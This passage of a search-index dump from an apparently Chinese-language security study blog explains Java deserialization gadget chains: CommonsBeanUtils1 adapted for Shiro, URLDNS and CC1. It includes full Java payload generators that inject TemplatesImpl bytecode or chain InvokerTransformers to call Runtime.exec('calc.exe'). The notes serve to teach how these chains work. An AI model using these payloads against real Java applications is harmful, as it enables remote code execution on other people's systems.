BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u89e3\u51b3\u7b2c\u4e8c\u4e2a\u5751\u70b9","text":"\u6211\u4eec\u6765\u770b\u770b\u6211\u4eec\u8fd9\u6761\u94fe\u7a76\u7adf\u662f\u54ea\u91cc\u7528\u5230\u4e86commons-collections\u7684\u4f9d\u8d56: \u5f53\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bcomparator\u65f6\uff0c\u4ed6\u4f1a\u4f7f\u7528commons-collections\u7684Comparator\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u4e00\u4e2a\u65b0\u7684Comparator\uff0c\u5b83\u8981\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6: - \u5b9e\u73b0 java.util.Comparator \u63a5\u53e3 - \u5b9e\u73b0 java.io.Serializable \u63a5\u53e3 - Java\u3001shiro\u6216commons-beanutils\u81ea\u5e26\uff0c\u4e14\u517c\u5bb9\u6027\u5f3a \u7ed3\u5408\u53c2\u8003\u6587\u7ae0\uff0c\u6211\u4eec\u627e\u5230\u4e86CaseInsensitiveComparator\u8fd9\u4e2a\u7c7b\uff0c\u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u901a\u8fc7 String.CASE_INSENSITIVE_ORDER \u62ff\u5230\u4e0a\u4e0b\u6587\u4e2d\u7684 CaseInsensitiveComparator \u5bf9\u8c61: \u5c06\u94fe\u7a0d\u4f5c\u4fee\u6539\uff0c\u4fee\u6539BeanComparator\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u5373\u53ef\u6210\u529f\u5728shiro\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801: package top.longlone ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.beanutils.BeanComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.PriorityQueue ; public class CB1 { public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } public static TemplatesImpl generateTemplates ( String code ) throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( code ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); return newTemplatesWithClassBytes ( classBytes ); } private static TemplatesImpl newTemplatesWithClassBytes ( byte [] classBytes ) throws Exception { TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , new byte [][] { classBytes }); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static byte [] getPayload () throws Exception { TemplatesImpl obj = generateTemplates ( \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ); final BeanComparator comparator = new BeanComparator ( null , String . CASE_INSENSITIVE_ORDER ); final PriorityQueue < Object > queue = new PriorityQueue < Object > ( 2 , comparator ); // stub data for replacement later queue . add ( \"1\" ); queue . add ( \"1\" ); setFieldValue ( comparator , \"property\" , \"outputProperties\" ); setFieldValue ( queue , \"queue\" , new Object [] { obj , obj }); // ================== // \u751f\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); return barr . toByteArray (); } public static void main ( String [] args ) throws Exception { byte [] payload = getPayload (); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( payload )); ois . readObject (); } }","title":"\u89e3\u51b3\u7b2c\u4e8c\u4e2a\u5751\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/#\u8c03\u7528\u903b\u8f91","text":"PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === BeanComparator.compare() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc71 # \u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u7684\u5bf9\u6bd4 # Java\u8bbe\u8ba1readObject\u7684\u601d\u8def\u548cPHP\u7684 wakeup\u4e0d\u540c\u70b9\u5728\u4e8e\uff1areadObject\u503e\u5411\u4e8e\u89e3\u51b3\u201c\u53cd\u5e8f\u5217\u5316\u65f6\u5982\u4f55\u8fd8\u539f\u4e00\u4e2a\u5b8c\u6574\u5bf9\u8c61\u201d\u8fd9\u4e2a\u95ee\u9898\uff0c\u800cPHP\u7684 wakeup\u66f4\u503e\u5411\u4e8e\u89e3\u51b3\u201c\u53cd\u5e8f\u5217\u5316\u540e\u5982\u4f55\u521d\u59cb\u5316\u8fd9\u4e2a\u5bf9\u8c61\u201d\u7684 \u95ee\u9898\u3002 php\u53cd\u5e8f\u5217\u5316 # \u7565 java\u53cd\u5e8f\u5217\u5316 # package top.longlone ; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils ; import java.io.IOException ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.io.Serializable ; public class Person implements Serializable { public String name ; public int age ; public Person ( String name , int age ) { this . name = name ; this . age = age ; } private void writeObject ( ObjectOutputStream s ) throws IOException { s . defaultWriteObject (); s . writeObject ( \"This is a object\" ); } private void readObject ( ObjectInputStream s ) throws IOException , ClassNotFoundException { s . defaultReadObject (); String message = ( String ) s . readObject (); System . out . println ( message ); } } package top.longlone ; import java.io.* ; public class SerializeDemo { private static String bytesToHexString ( byte [] bytes ) { StringBuffer sb = new StringBuffer (); for ( int i = 0 ; i < bytes . length ; i ++ ) { String strHex = Integer . toHexString ( bytes [ i ] ); if ( strHex . length () > 3 ) { sb . append ( strHex . substring ( 6 )); } else { if ( strHex . length () < 2 ) { sb . append ( \"0\" + strHex ); } else { sb . append ( strHex ); } } } return sb . toString (); } public static void main ( String [] args ) { Person person = new Person ( \"Tom\" , 18 ); try { ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream out = new ObjectOutputStream ( baos ); out . writeObject ( person ); byte [] bytes = baos . toByteArray (); out . close (); baos . close (); System . out . print ( bytesToHexString ( bytes )); } catch ( IOException i ) { i . printStackTrace (); } } } \u8fd9\u4e2a\u7279\u6027\u5c31\u8ba9Java\u7684\u5f00\u53d1\u53d8\u5f97\u975e\u5e38\u7075\u6d3b\u3002\u6bd4\u5982\u540e\u9762\u5c06\u4f1a\u8bb2\u5230\u7684HashMap\uff0c\u5176\u5c31\u662f\u5c06Map\u4e2d\u7684\u6240\u6709\u952e\u3001 \u503c\u90fd\u5b58\u50a8\u5728objectAnnotation\u4e2d\uff0c\u800c\u5e76\u4e0d\u662f\u67d0\u4e2a\u5177\u4f53\u5c5e\u6027\u91cc\u3002\u5173\u4e8e\u4e00\u4e9b\u5177\u4f53\u7c7b\u662f\u5982\u4f55\u4f7f\u7528readObject\u65b9\u6cd5\u7684\uff0c\u6211\u4eec\u540e\u9762\u5728\u8bf4\u5230gadget\u7684\u65f6\u5019\u4f1a\u8be6\u7ec6\u5206\u6790\u3002 python\u53cd\u5e8f\u5217\u5316 # \u7565","title":"\u53cd\u5e8f\u5217\u5316\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/#\u53cd\u5e8f\u5217\u5316\u7bc71","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc71"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/#\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u7684\u5bf9\u6bd4","text":"Java\u8bbe\u8ba1readObject\u7684\u601d\u8def\u548cPHP\u7684 wakeup\u4e0d\u540c\u70b9\u5728\u4e8e\uff1areadObject\u503e\u5411\u4e8e\u89e3\u51b3\u201c\u53cd\u5e8f\u5217\u5316\u65f6\u5982\u4f55\u8fd8\u539f\u4e00\u4e2a\u5b8c\u6574\u5bf9\u8c61\u201d\u8fd9\u4e2a\u95ee\u9898\uff0c\u800cPHP\u7684 wakeup\u66f4\u503e\u5411\u4e8e\u89e3\u51b3\u201c\u53cd\u5e8f\u5217\u5316\u540e\u5982\u4f55\u521d\u59cb\u5316\u8fd9\u4e2a\u5bf9\u8c61\u201d\u7684 \u95ee\u9898\u3002","title":"\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u7684\u5bf9\u6bd4"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/#php\u53cd\u5e8f\u5217\u5316","text":"\u7565","title":"php\u53cd\u5e8f\u5217\u5316"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/#java\u53cd\u5e8f\u5217\u5316","text":"package top.longlone ; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils ; import java.io.IOException ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.io.Serializable ; public class Person implements Serializable { public String name ; public int age ; public Person ( String name , int age ) { this . name = name ; this . age = age ; } private void writeObject ( ObjectOutputStream s ) throws IOException { s . defaultWriteObject (); s . writeObject ( \"This is a object\" ); } private void readObject ( ObjectInputStream s ) throws IOException , ClassNotFoundException { s . defaultReadObject (); String message = ( String ) s . readObject (); System . out . println ( message ); } } package top.longlone ; import java.io.* ; public class SerializeDemo { private static String bytesToHexString ( byte [] bytes ) { StringBuffer sb = new StringBuffer (); for ( int i = 0 ; i < bytes . length ; i ++ ) { String strHex = Integer . toHexString ( bytes [ i ] ); if ( strHex . length () > 3 ) { sb . append ( strHex . substring ( 6 )); } else { if ( strHex . length () < 2 ) { sb . append ( \"0\" + strHex ); } else { sb . append ( strHex ); } } } return sb . toString (); } public static void main ( String [] args ) { Person person = new Person ( \"Tom\" , 18 ); try { ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream out = new ObjectOutputStream ( baos ); out . writeObject ( person ); byte [] bytes = baos . toByteArray (); out . close (); baos . close (); System . out . print ( bytesToHexString ( bytes )); } catch ( IOException i ) { i . printStackTrace (); } } } \u8fd9\u4e2a\u7279\u6027\u5c31\u8ba9Java\u7684\u5f00\u53d1\u53d8\u5f97\u975e\u5e38\u7075\u6d3b\u3002\u6bd4\u5982\u540e\u9762\u5c06\u4f1a\u8bb2\u5230\u7684HashMap\uff0c\u5176\u5c31\u662f\u5c06Map\u4e2d\u7684\u6240\u6709\u952e\u3001 \u503c\u90fd\u5b58\u50a8\u5728objectAnnotation\u4e2d\uff0c\u800c\u5e76\u4e0d\u662f\u67d0\u4e2a\u5177\u4f53\u5c5e\u6027\u91cc\u3002\u5173\u4e8e\u4e00\u4e9b\u5177\u4f53\u7c7b\u662f\u5982\u4f55\u4f7f\u7528readObject\u65b9\u6cd5\u7684\uff0c\u6211\u4eec\u540e\u9762\u5728\u8bf4\u5230gadget\u7684\u65f6\u5019\u4f1a\u8be6\u7ec6\u5206\u6790\u3002","title":"java\u53cd\u5e8f\u5217\u5316"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/#python\u53cd\u5e8f\u5217\u5316","text":"\u7565","title":"python\u53cd\u5e8f\u5217\u5316"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc72 # URLDNS # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: HashMap.readObject() HashMap.hash() URL.hashCode() URLStreamHandler.hashCode() URLStreamHandler.getHostAddress() InetAddress.getByName() \u8981\u6784\u9020\u8fd9\u4e2aGadget\uff0c\u53ea\u9700\u8981\u521d\u59cb\u5316\u2f00\u4e00\u4e2a java.net.URL\u5bf9\u8c61\uff0c\u4f5c\u4e3akey\u653e\u5728java.util.HashMap \u4e2d\uff1b\u7136\u540e\uff0c\u8bbe\u7f6e\u8fd9\u4e2aURL\u5bf9\u8c61\u7684hashCode\u4e3a\u521d\u59cb\u503c-1 \uff0c\u8fd9\u6837\u53cd\u5e8f\u5217\uf99c\u5316\u65f6\u5c06\u4f1a\u91cd\u65b0\u8ba1\u7b97 \u5176hashCode \uff0c\u624d\u80fd\u89e6\u53d1\u5230\u540e\u2faf\u9762\u7684DNS\u8bf7\u6c42\uff0c\u5426\u5219\u4e0d\uf967\u4f1a\u8c03\u2f64\u7528 URL->hashCode()\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/#\u53cd\u5e8f\u5217\u5316\u7bc72","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc72"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/#urldns","text":"\u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: HashMap.readObject() HashMap.hash() URL.hashCode() URLStreamHandler.hashCode() URLStreamHandler.getHostAddress() InetAddress.getByName() \u8981\u6784\u9020\u8fd9\u4e2aGadget\uff0c\u53ea\u9700\u8981\u521d\u59cb\u5316\u2f00\u4e00\u4e2a java.net.URL\u5bf9\u8c61\uff0c\u4f5c\u4e3akey\u653e\u5728java.util.HashMap \u4e2d\uff1b\u7136\u540e\uff0c\u8bbe\u7f6e\u8fd9\u4e2aURL\u5bf9\u8c61\u7684hashCode\u4e3a\u521d\u59cb\u503c-1 \uff0c\u8fd9\u6837\u53cd\u5e8f\u5217\uf99c\u5316\u65f6\u5c06\u4f1a\u91cd\u65b0\u8ba1\u7b97 \u5176hashCode \uff0c\u624d\u80fd\u89e6\u53d1\u5230\u540e\u2faf\u9762\u7684DNS\u8bf7\u6c42\uff0c\u5426\u5219\u4e0d\uf967\u4f1a\u8c03\u2f64\u7528 URL->hashCode()\u3002","title":"URLDNS"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc73 # CC1 # \u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u662f\u8bb2\u89e3\u4e86CC1\u94fe\u7684\u672c\u8d28\uff0c\u8ba9\u8bfb\u8005\u80fd\u591f\u66f4\u5bb9\u6613\u5730\u660e\u767d\u3002 \u8fd9\u91ccP\u725b\u7684pdf\u5df2\u7ecf\u5199\u7684\u5f88\u597d\u4e86\uff0c\u5c31\u7a0d\u5fae\u603b\u7ed3\u4e00\u4e0b\u3002 \u8fd9\u4e2a\u662fP\u725b\u7b80\u5316\u8fc7\u7684\u4ee3\u7801\uff0c\u6267\u884c\u540e\u5c06\u4f1a\u5f39\u8ba1\u7b97\u5668(\u9700\u8981\u7a0d\u5fae\u4fee\u6539\u4e0b\u4ee3\u7801\uff0c\u5982package\uff0c/System/Applications/Calculator.app/Contents/MacOS/Calculator): package com.govuln.deserialization ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class CommonsCollectionsIntro { public static void main ( String [] args ) throws Exception { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . getRuntime ()), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformerChain = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); Map outerMap = TransformedMap . decorate ( innerMap , null , transformerChain ); outerMap . put ( \"test\" , \"xxxx\" ); } } \u8fd9\u91cc\u9700\u8981\u5b66\u4e60\u7684\u5c31\u662f\u51e0\u4e2a\u65b0\u7684\u7c7b\u3002 \u7406\u89e3\u7c7b # TransformedMap # TransformedMap\u2f64\u4e8e\u5bf9Java\u6807\u51c6\u6570\u636e\u7ed3\u6784Map\u505a\u2f00\u4e2a\u4fee\u9970\uff0c\u88ab\u4fee\u9970\u8fc7\u7684Map\u5728\u6dfb\u52a0\u65b0\u7684\u5143\u7d20\u65f6\uff0c\u5c06\u6267\u2f8f\u2f00\u4e2a\u56de\u8c03\u3002\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u8fd9\u884c\u4ee3\u7801\u5bf9innerMap\u8fdb\u2f8f\u4fee\u9970\uff0c\u4f20\u51fa\u7684outerMap\u5373\u662f\u4fee\u9970\u540e\u7684Map Map outerMap = TransformedMap . decorate ( innerMap , keyTransformer , valueTransformer ); Transformer # Transformer\u662f\u2f00\u4e2a\u63a5\u53e3\uff0c\u5b83\u53ea\u6709\u2f00\u4e2a\u5f85\u5b9e\u73b0\u7684\u65b9\u6cd5 transform \uff0cTransformedMap\u5728\u8f6c\u6362\u65b0\u5143\u7d20\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528Transformer\u4e2d\u7684transform\u65b9\u6cd5\u3002 ConstantTransformer # ConstantTransformer\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u2f1d\u7684\u2f00\u4e2a\u7c7b\uff0c\u5176\u6784\u9020\u51fd\u6570\u662f\u63a5\u6536\u4e00\u4e2a\u5bf9\u8c61\u5e76\u5b58\u50a8\uff0c\u5728transform\u65f6\u5c06\u8be5\u5bf9\u8c61\u8fd4\u56de public ConstantTransformer ( Object constantToReturn ) { super (); iConstant = constantToReturn ; } public Object transform ( Object input ) { return iConstant ; } InvokerTransformer # InvokerTransformer\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u53e3\u7684\u2f00\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u7528\u6765\u6267\u884c\u4efb\u610f\u65b9\u6cd5\uff0c\u8fd9\u4e5f\u662f\u53cd\u5e8f\u5217\u5316\u80fd\u6267\u884c\u4efb\u610f\u4ee3\u7801\u7684\u5173\u952e\u3002 \u6784\u9020\u65b9\u6cd5\u5982\u4e0b: public InvokerTransformer ( String methodName , Class [] paramTypes , Object [] args ) { super (); iMethodName = methodName ; iParamTypes = paramTypes ; iArgs = args ; } transform\u65b9\u6cd5\u5982\u4e0b\uff0c\u6267\u884c\u4e86input\u5bf9\u8c61\u7684iMethodName\u65b9\u6cd5: public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); Method method = cls . getMethod ( iMethodName , iParamTypes ); return method . invoke ( input , iArgs ); } catch ( NoSuchMethodException ex ) { // ... } ChainedTransformer # ChainedTransformer\u4e5f\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u2f1d\u7684\u2f00\u4e2a\u7c7b\uff0c\u5b83\u7684\u4f5c\u2f64\u662f\u5c06\u5185\u90e8\u7684\u591a\u4e2aTransformer\u4e32 \u5728\u2f00\u8d77\u3002\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\uff0c\u524d\u2f00\u4e2a\u56de\u8c03\u8fd4\u56de\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u540e\u2f00\u4e2a\u56de\u8c03\u7684\u53c2\u6570\u4f20\u2f0a\uff0c\u6211\u4eec\u753b\u2f00\u4e2a\u56fe\u505a\u793a\u610f\uff1a \u7406\u89e3Demo # \u5f53\u6211\u4eec\u7406\u89e3\u4e0a\u9762\u51e0\u4e2a\u7c7b\u7684\u4f5c\u7528\u4e4b\u540e\uff0cDemo\u7684\u4ee3\u7801\u5c31\u975e\u5e38\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u5176\u5b9e\u9645\u4e0a\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4: 1. \u521b\u5efa\u4e86\u4e00\u4e2a\u94fe\u5f0f\u7684Transformer( ChainedTransformer )\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e24\u4e2aTransformer( ConstantTransformer \u548c InvokerTransformer )\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u6267\u884c Runtime.exec \u65b9\u6cd5 2. \u521b\u5efaHashMap\u5b9e\u4f8b\uff0c\u5e76\u7528 TransformedMap.decorate \u6765\u5305\u88c5HashMap\uff0c\u5f53\u53d1\u751fvalue\u8f6c\u6362\u7684\u65f6\u5019\u56de\u8c03 ChainedTransformer 3. \u4f7f\u7528 HashMap.out \u65b9\u6cd5\u5f80Map\u4e2d\u653e\u5165\u65b0\u5143\u7d20\uff0c\u89e6\u53d1\u56de\u8c03","title":"\u53cd\u5e8f\u5217\u5316\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#\u53cd\u5e8f\u5217\u5316\u7bc73","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc73"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#cc1","text":"\u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u662f\u8bb2\u89e3\u4e86CC1\u94fe\u7684\u672c\u8d28\uff0c\u8ba9\u8bfb\u8005\u80fd\u591f\u66f4\u5bb9\u6613\u5730\u660e\u767d\u3002 \u8fd9\u91ccP\u725b\u7684pdf\u5df2\u7ecf\u5199\u7684\u5f88\u597d\u4e86\uff0c\u5c31\u7a0d\u5fae\u603b\u7ed3\u4e00\u4e0b\u3002 \u8fd9\u4e2a\u662fP\u725b\u7b80\u5316\u8fc7\u7684\u4ee3\u7801\uff0c\u6267\u884c\u540e\u5c06\u4f1a\u5f39\u8ba1\u7b97\u5668(\u9700\u8981\u7a0d\u5fae\u4fee\u6539\u4e0b\u4ee3\u7801\uff0c\u5982package\uff0c/System/Applications/Calculator.app/Contents/MacOS/Calculator): package com.govuln.deserialization ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class CommonsCollectionsIntro { public static void main ( String [] args ) throws Exception { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . getRuntime ()), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformerChain = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); Map outerMap = TransformedMap . decorate ( innerMap , null , transformerChain ); outerMap . put ( \"test\" , \"xxxx\" ); } } \u8fd9\u91cc\u9700\u8981\u5b66\u4e60\u7684\u5c31\u662f\u51e0\u4e2a\u65b0\u7684\u7c7b\u3002","title":"CC1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#\u7406\u89e3\u7c7b","text":"","title":"\u7406\u89e3\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#transformedmap","text":"TransformedMap\u2f64\u4e8e\u5bf9Java\u6807\u51c6\u6570\u636e\u7ed3\u6784Map\u505a\u2f00\u4e2a\u4fee\u9970\uff0c\u88ab\u4fee\u9970\u8fc7\u7684Map\u5728\u6dfb\u52a0\u65b0\u7684\u5143\u7d20\u65f6\uff0c\u5c06\u6267\u2f8f\u2f00\u4e2a\u56de\u8c03\u3002\u6211\u4eec\u901a\u8fc7\u4e0b\u9762\u8fd9\u884c\u4ee3\u7801\u5bf9innerMap\u8fdb\u2f8f\u4fee\u9970\uff0c\u4f20\u51fa\u7684outerMap\u5373\u662f\u4fee\u9970\u540e\u7684Map Map outerMap = TransformedMap . decorate ( innerMap , keyTransformer , valueTransformer );","title":"TransformedMap"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#transformer","text":"Transformer\u662f\u2f00\u4e2a\u63a5\u53e3\uff0c\u5b83\u53ea\u6709\u2f00\u4e2a\u5f85\u5b9e\u73b0\u7684\u65b9\u6cd5 transform \uff0cTransformedMap\u5728\u8f6c\u6362\u65b0\u5143\u7d20\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528Transformer\u4e2d\u7684transform\u65b9\u6cd5\u3002","title":"Transformer"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#constanttransformer","text":"ConstantTransformer\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u2f1d\u7684\u2f00\u4e2a\u7c7b\uff0c\u5176\u6784\u9020\u51fd\u6570\u662f\u63a5\u6536\u4e00\u4e2a\u5bf9\u8c61\u5e76\u5b58\u50a8\uff0c\u5728transform\u65f6\u5c06\u8be5\u5bf9\u8c61\u8fd4\u56de public ConstantTransformer ( Object constantToReturn ) { super (); iConstant = constantToReturn ; } public Object transform ( Object input ) { return iConstant ; }","title":"ConstantTransformer"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/#invokertransformer","text":"InvokerTransformer\u662f\u5b9e\u73b0\u4e86Transformer\u63a5\u53e3\u7684\u2f00\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u7528\u6765\u6267\u884c\u4efb\u610f\u65b9\u6cd5\uff0c\u8fd9\u4e5f\u662f\u53cd\u5e8f\u5217\u5316\u80fd\u6267\u884c\u4efb\u610f\u4ee3\u7801\u7684\u5173\u952e\u3002 \u6784\u9020\u65b9\u6cd5\u5982\u4e0b: public InvokerTransformer ( String methodName , Class [] paramTypes , Object [] args ) { super (); iMethodName = methodName ; iParamTypes = paramTypes ; iArgs = args ; } transform\u65b9\u6cd5\u5982\u4e0b\uff0c\u6267\u884c\u4e86input\u5bf9\u8c61\u7684iMethodName\u65b9\u6cd5: public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); Method method = cls . getMethod ( iMethodName , iParamTypes ); return method . invoke ( input , iArgs ); } catch ( NoSuchMethodException ex ) { // ... 